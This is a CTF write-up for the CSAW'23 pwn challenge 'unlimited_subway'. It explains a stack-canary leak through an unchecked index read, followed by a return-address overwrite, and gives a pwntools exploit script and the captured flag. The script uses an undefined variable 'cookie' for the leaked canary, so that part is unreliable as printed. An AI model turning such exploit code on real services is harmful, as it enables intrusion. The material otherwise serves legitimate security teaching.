# CSAW'23

## unlimited_subway

> 
> Imagine being able to ride the subway for free, forever.
>
>  Author: 079
>
> [`share.zip`](share.zip)

Tags: _pwn_

## Solution
For this challenge we get a `zip archive` containing a binary. First we check what properties the binary has. `PIE` is disabled meaning we can work with absolute addresses and don't need to have a leak to get the `image base`. Otherwise `NX` is enabled, so no shellcode on the stack, `canary` is used meaning we can't overflow and rewrite the `ret` address without leaking the stack canary first.

```bash
─$ checksec unlimited_subway
[*] '/home/ctf/unlimited_subway'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

Next, lets have a look with `Ghidra` to see what the binary actually does. The main loop is short and easy. The menu is printed, we have the options to [F]ill account info, [V]iew account info or just to [E]xit.

```bash
=====================================
=                                   =
=       Subway Account System       =
=                                   =
=====================================
[F]ill account info
[V]iew account info
[E]xit
```

If we fill the account info, we can read 64 bytes to `local_88`, there's nothing too exciting here. Viewing the account info, on the other hand, does no bounds check and lets us read from whatever memory region we have read access to. This is great, since we can leak this, for instance the stack canary this way if we need to overflow the stack.

```c
  while( true ) {
    while( true ) {
      while( true ) {
        print_menu();
        read(0,&local_8a,2);
        if ((char)local_8a != 'F') break;
        printf("Data : ");
        read(0,&local_88,0x40);
      }
      if ((char)local_8a != 'V') break;
      printf("Index : ");
      __isoc99_scanf(&DAT_0804a0e9,&local_94);
      view_account(&local_88,local_94);
    }
    if ((char)local_8a == 'E') break;
    puts("Invalid choice");
  }
  printf("Name Size : ");
  __isoc99_scanf(&DAT_0804a0e9,&local_90);
  printf("Name : ");
  read(0,&local_48,local_90)
```

```c
void view_account(int param_1,int param_2)
{
  printf("Index %d : %02x\n",param_2,(uint)*(byte *)(param_1 + param_2));
  return;
}
```

Then there is a function `print_flag` which just calls `system("cat ./flag")` and obviously is our target. Since the function is not called anywhere we have to call it on our own. But how can we do this? 

If we go back to `main` we can see that, after exiting, we can enter a name. And since we also can specify the `size` parameter for `read` we have a overflow here where we can set the `ret` address on the stack to point to `print_flag`. To do this successfully we have to take care that the stack canary is kept intact and the buffer overflow is not detected. The plan is therefore to leak the canary first and then overflow and set the ret address.

Leaking the canary can be done byte by byte, by calling `View account info` with large offsets.

```python 
from pwn import *

p = remote("pwn.csaw.io", 7900)
e = ELF("./unlimited_subway", checksec=False)

canary = b""
offset = 120+8
for i in range(offset,offset+4):
    p.sendlineafter(b"> ", b"V")
    p.sendlineafter(b"Index ", f"{i}".encode())
    canary = p.recvline().split()[-1]+canary

canary = int(canary,16)
print(f"Canary {hex(canary)}")
```

After we have the canary we can build our buffer overflow payload.

```python
# exit
p.sendlineafter(b"> ", b"E")

payload = b""
payload = payload + b"A"*(0x48-2*4)
payload = payload + p32(cookie)
payload = payload + b"A"*4
payload = payload + p32(e.sym["print_flag"])

p.sendlineafter(b"Name Size :", str(len(payload)).encode())
p.sendlineafter(b"Name : ", payload)
p.interactive()
```

After we run the script against the service we get our flag.

```bash
$ python solve.py
[+] Opening connection to pwn.csaw.io on port 7900: Done
Canary 0xd6be8900
[*] Switching to interactive mode
csawctf{my_n4m3_15_079_4nd_1m_601n6_70_h0p_7h3_7urn571l3}
```

Flag `csawctf{my_n4m3_15_079_4nd_1m_601n6_70_h0p_7h3_7urn571l3}`